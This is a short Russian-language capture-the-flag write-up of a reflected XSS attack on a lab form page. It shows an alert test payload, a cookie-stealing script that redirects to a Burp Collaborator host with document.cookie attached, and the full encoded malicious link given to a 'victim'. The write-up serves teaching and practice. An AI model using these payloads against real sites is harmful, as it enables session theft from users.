# XSS_stealcookie_basic_example

Дана простая страница с формой, которая публикует записи на странице.

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image.png)

Текст записи формируется из параметра `test` . Проверяем на уязвимость XSS:

```php
<script>alert('1')</script>
```

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%201.png)

Уязвимость подтверждена. С учетом того, что контент записи передается посредством GET-параметра, можно осуществить Reflected XSS.

Для этой атаки, воспользуемся Burp Collaborator из Pro-версии.

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%202.png)

Нажимаем `Copy to clipboard` , копируем URL-адрес хука, модифицируем пейлоад.

```php
<script>document.location="http://uig5qcc42hlnqgtcsy5jd11tekkd85wu.oastify.com?c="+document.cookie</script>
```

Вставляем в форму и проверяем работоспособность:

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%203.png)

Запрос направился на хук, куки включены в URL. В Collaborator ждем пока обновится или сами нажимаем `Poll now`, и тоже видим запрос. 

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%204.png)

Чтобы собрать вредоносный URL с отраженным XSS, включаем Proxy Intercept, ловим запрос, собираем полный URL — готово!

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%205.png)

```bash
http://172.23.215.92:8022/c6699f30299e9eb31b7363f7b3271f39/?test=%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fuig5qcc42hlnqgtcsy5jd11tekkd85wu.oastify.com%3Fc%3D%22%2Bdocument.cookie%3C%2Fscript%3E
```

---

Далее остается лишь предоставить жертве “зараженную” ссылку и дождаться, когда он по ней перейдет. В этом задании нужно было еще закодировать ссылку в base64, чтобы не сбить форматирование. Отдаем ссылку:

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%206.png)

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%207.png)

Проверяем Collaborator:

![image.png](XSS_stealcookie_basic_example%2019b021737a8980af843befffcbbc657a/image%208.png)

Готово, флаг у нас!